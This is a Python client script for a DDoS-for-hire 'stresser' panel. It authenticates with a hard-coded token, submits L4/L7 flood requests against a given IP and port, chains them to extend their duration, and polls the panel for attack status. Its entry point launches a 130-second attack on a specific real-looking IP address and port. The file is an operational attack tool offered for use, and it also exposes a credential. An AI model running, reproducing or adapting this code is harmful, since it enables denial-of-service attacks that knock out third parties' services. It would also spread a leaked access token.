import requests
import time
import json
import re
from bs4 import BeautifulSoup
from datetime import datetime

class RetroStresser:
    def __init__(self, auth_token=None):
        self.session = requests.Session()
        self.base_url = "https://retrostress.net"
        self.auth_token = auth_token or "517f13d366214d958526a1c7591931818808e175d10842d7b271c0ff14138799"
        
        # Set default headers
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': f'{self.base_url}/panel'
        })
        
        # Set auth cookie
        self.session.cookies.set('auth_token', self.auth_token)
        
        # Auto-detect antiforgery token
        self.detect_antiforgery_token()
        
    def detect_antiforgery_token(self):
        """Auto-detect antiforgery token from website"""
        try:
            response = self.session.get(f'{self.base_url}/panel')
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find antiforgery token
            token = None
            for cookie in self.session.cookies:
                if '.AspNetCore.Antiforgery' in cookie.name:
                    token = cookie.value
                    print(f"[✓] Antiforgery token detected: {token[:30]}...")
                    break
            
            # Alternative: find in meta tags
            if not token:
                meta_token = soup.find('meta', {'name': 'csrf-token'})
                if meta_token:
                    token = meta_token.get('content')
                    print(f"[✓] CSRF token detected from meta")
            
            return token
        except Exception as e:
            print(f"[!] Could not detect antiforgery token: {e}")
            return None

    def get_attack_status(self):
        """Get current running attacks status"""
        try:
            response = self.session.get(f'{self.base_url}/panel')
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find active attacks section
            active_section = soup.find('aside', class_='ct-active')
            if active_section:
                runs = active_section.find_all('div', class_='ct-run')
                attacks = []
                
                for run in runs:
                    # Extract target IP
                    target_elem = run.find('div', class_='ct-run-target')
                    target = target_elem.text.strip() if target_elem else "Unknown"
                    
                    # Extract time
                    time_elem = run.find('span', class_='ct-run-time')
                    time_text = time_elem.text.strip() if time_elem else "0s / 0s"
                    
                    # Extract method
                    method_elem = run.find('div', class_='ct-run-meta')
                    method = method_elem.find('span').text if method_elem else "Unknown"
                    
                    # Extract status
                    status_elem = run.find('span', class_='ct-chip')
                    status = status_elem.text.strip() if status_elem else "Unknown"
                    
                    attacks.append({
                        'target': target,
                        'time': time_text,
                        'method': method,
                        'status': status
                    })
                
                return attacks
            return []
        except Exception as e:
            print(f"[!] Error getting status: {e}")
            return []

    def send_attack(self, ip, port, duration, method="L4", target_id=None):
        """
        Send attack request
        Options: method = L4, L7, etc.
        """
        # Different endpoints based on attack type
        attack_endpoints = {
            'L4': f'{self.base_url}/api/attack/l4',
            'L7': f'{self.base_url}/api/attack/l7'
        }
        
        api_url = attack_endpoints.get(method, f'{self.base_url}/api/attack')
        
        # Payload as per website requirements
        payload = {
            'ip': ip,
            'port': port,
            'time': duration,
            'method': method,
            'target_id': target_id or int(time.time())
        }
        
        # Headers for API request
        headers = {
            'Content-Type': 'application/json',
            'Origin': self.base_url,
            'Referer': f'{self.base_url}/panel'
        }
        
        try:
            print(f"\n[→] Sending attack: {method} {ip}:{port} for {duration}s")
            response = self.session.post(api_url, json=payload, headers=headers)
            
            if response.status_code == 200:
                print(f"[✓] Attack started successfully!")
                return True
            else:
                print(f"[✗] Attack failed! Status: {response.status_code}")
                print(f"Response: {response.text[:200]}")
                return False
                
        except Exception as e:
            print(f"[✗] Error sending attack: {e}")
            return False

    def monitor_attack(self, ip, check_interval=2):
        """Monitor attack status in real-time"""
        print(f"\n[👁] Monitoring attacks on {ip}...")
        print("-" * 50)
        
        last_status = None
        while True:
            attacks = self.get_attack_status()
            
            found = False
            for attack in attacks:
                if attack['target'] == ip:
                    found = True
                    if attack != last_status:
                        print(f"[⏱] {attack['time']} | {attack['status']} | {attack['target']} ({attack['method']})")
                        last_status = attack
                    
                    # Check if attack completed
                    if 'Completed' in attack['status'] or 'ended' in attack['status'].lower():
                        print(f"\n[✓] Attack on {ip} completed!")
                        return True
                    break
            
            if not found and last_status:
                print(f"\n[✓] Attack on {ip} has finished!")
                return True
            
            time.sleep(check_interval)

    def execute_attack(self, ip, port, total_time, method="L4", monitor=True):
        """
        Main execution with time splitting
        """
        # Time validation and splitting
        if total_time < 30:
            print(f"[!] Minimum 30 seconds required. Adjusting to 30s.")
            total_time = 30
        
        # Calculate attacks
        attacks = []
        while total_time > 0:
            if total_time >= 60:
                attacks.append(60)
                total_time -= 60
            else:
                if total_time >= 30:
                    attacks.append(total_time)
                else:
                    # Less than 30 seconds remaining, add to last attack
                    if attacks:
                        attacks[-1] += total_time
                    else:
                        attacks.append(total_time)
                break
        
        print(f"\n{'='*50}")
        print(f"[🎯] TARGET: {ip}:{port}")
        print(f"[⚙️] METHOD: {method}")
        print(f"[⏱️] TOTAL: {sum(attacks)} seconds")
        print(f"[📊] SPLIT: {attacks}")
        print(f"{'='*50}")
        
        # Execute attacks
        for i, duration in enumerate(attacks, 1):
            print(f"\n[🔥] Attack {i}/{len(attacks)} - {duration} seconds")
            
            success = self.send_attack(ip, port, duration, method)
            
            if success:
                if monitor and i == 1:  # Monitor only first attack
                    self.monitor_attack(ip)
                else:
                    print(f"[💤] Waiting {duration} seconds...")
                    time.sleep(duration)
            else:
                print(f"[✗] Attack {i} failed. Stopping.")
                return False
        
        print(f"\n{'='*50}")
        print(f"[✅] ALL ATTACKS COMPLETED SUCCESSFULLY!")
        print(f"{'='*50}")
        return True


# ============ QUICK USAGE ============

def main():
    # Initialize with your auth token
    auth_token = "517f13d366214d958526a1c7591931818808e175d10842d7b271c0ff14138799"
    stresser = RetroStresser(auth_token)
    
    # Check current attacks
    print("\n[📊] Current active attacks:")
    attacks = stresser.get_attack_status()
    for attack in attacks:
        print(f"  - {attack['target']}: {attack['time']} ({attack['status']})")
    
    # Execute new attack
    print("\n" + "="*50)
    ip = input("Enter target IP: ").strip() or "4.213.178.10"
    port = int(input("Enter port: ").strip() or "17219")
    time_sec = int(input("Enter time (30-60 recommended): ").strip() or "30")
    method = input("Enter method (L4/L7): ").strip().upper() or "L4"
    
    stresser.execute_attack(ip, port, time_sec, method, monitor=True)

if __name__ == "__main__":
    # Direct attack example
    stresser = RetroStresser("517f13d366214d958526a1c7591931818808e175d10842d7b271c0ff14138799")
    
    # Attack without monitoring (just send request)
    # stresser.execute_attack("4.213.178.10", 17219, 30, "L4", monitor=False)
    
    # Attack with monitoring
    stresser.execute_attack("4.213.178.10", 17219, 130, "L4", monitor=True)
    
    # Or use interactive mode
    # main()
